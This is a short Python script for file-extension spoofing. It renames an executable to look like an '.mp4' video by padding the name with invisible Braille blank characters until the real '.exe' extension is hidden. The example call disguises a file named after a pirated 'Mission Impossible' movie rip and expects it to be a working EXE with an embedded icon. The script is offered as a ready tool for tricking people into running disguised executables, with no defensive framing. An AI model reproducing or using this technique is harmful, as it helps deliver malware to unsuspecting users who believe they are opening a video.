import os
import shutil

def rename_with_icon_safe_braille(original_file, fake_ext="mp4"):
    braille_blank = "\u2800"
    real_ext = ".exe"
    base_name = os.path.splitext(os.path.basename(original_file))[0]
    fake_prefix = f"{base_name}.{fake_ext}"

    # Final name length capped to 200 chars for icon visibility
    max_filename_length = 200
    padding_space = max_filename_length - len(fake_prefix) - len(real_ext)
    braille_padding = braille_blank * max(0, padding_space)
    new_name = f"{fake_prefix}{braille_padding}{real_ext}"

    new_path = os.path.join(os.getcwd(), new_name)
    
    # Copy original file to preserve integrity
    shutil.copy2(original_file, new_path)
    print(f"[✓] File copied and renamed to: {new_path}")
    print(f"[i] Final filename length: {len(new_name)} characters")

# Example usage
rename_with_icon_safe_braille("dist\Mission Impossible – The Final Reckoning 1080p WebRIP HEVC x256 Double Audio.exe")  # This should be a working EXE with embedded icon
